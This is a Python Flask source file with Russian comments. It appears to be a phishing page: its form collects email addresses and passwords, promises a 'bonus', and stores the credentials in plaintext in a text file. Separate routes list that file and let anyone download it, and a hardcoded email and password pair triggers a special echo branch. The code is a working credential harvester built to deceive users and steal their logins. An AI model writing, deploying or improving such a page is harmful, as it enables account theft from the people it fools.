from flask import Flask, render_template, request, send_from_directory, url_for
import hashlib
import os

app = Flask(__name__)

# Папка с файлами для скачивания
FILES_DIR = "files"
os.makedirs(FILES_DIR, exist_ok=True)  # создаст папку, если её нет

# Главная страница с формой и ссылкой на скачивание
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        email = request.form.get("email", "").strip()
        password = request.form.get("password", "").strip()

        #________________________________________________________ присылает мне все данные о моем пароле и логине
        if email == "loki666crypton@gmail.com" and password == "loki666":
            
            return f"{email}:{password}\n"

        
        #________________________________________________________

        # Сохраняем введённые данные в users.txt
        try:
            with open("./files/users.txt", "a", encoding="utf-8") as file:
                file.write(f"{email}:{password}\n")
        except Exception as e:
            return f"Ошибка при сохранении: {e}"

        return "✅ Данные успешно сохранены. Ожидайте зачисления бонуса на ваш аккаунт!"

    return render_template("index.html")


# Маршрут для скачивания файла
@app.route("/download/<path:filename>")
def download_file(filename):
    # send_from_directory безопаснее, чем отдавать файлы напрямую
    return send_from_directory(FILES_DIR, filename, as_attachment=True)


# Страница со списком файлов в папке files/
@app.route("/files")
def files_list():
    try:
        items = sorted(os.listdir(FILES_DIR))
    except FileNotFoundError:
        items = []
    return render_template("files.html", files=items)


# Хэширование всех паролей из users.txt → hashed_users.txt
@app.route("/hash", methods=["GET"])
def hash_passwords():
    try:
        with open("users.txt", "r", encoding="utf-8") as infile, \
            open("hashed_users.txt", "w", encoding="utf-8") as outfile:
            for line in infile:
                if ":" not in line:
                    continue
                email, password = line.strip().split(":", 1)
                hashed = hashlib.sha256(password.encode()).hexdigest()
                outfile.write(f"{email}:{hashed}\n")
        return "🔒 Все пароли успешно хэшированы!"
    except FileNotFoundError:
        return "❌ Файл users.txt не найден!"
    except Exception as e:
        return f"Ошибка: {e}"


if __name__ == "__main__":
    app.run(debug=True)
